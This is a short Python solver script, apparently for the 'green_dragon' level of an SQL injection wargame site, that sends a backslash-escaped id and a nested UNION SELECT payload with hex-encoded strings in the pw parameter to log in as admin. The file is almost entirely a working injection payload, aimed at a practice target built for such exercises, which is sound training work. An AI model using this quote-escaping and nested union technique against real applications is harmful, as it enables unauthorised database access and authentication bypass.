from constants import *

chall_url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote(f"\\") +
                   "&pw=" + urllib.parse.quote(" or 1=1 union select " + ascii_to_hex("\\") + "," +
                                               ascii_to_hex(f" or 1 = 1 union select {admin_in_hex} -- -") + " -- -"),
                   unquote=False)
check_clear(res)
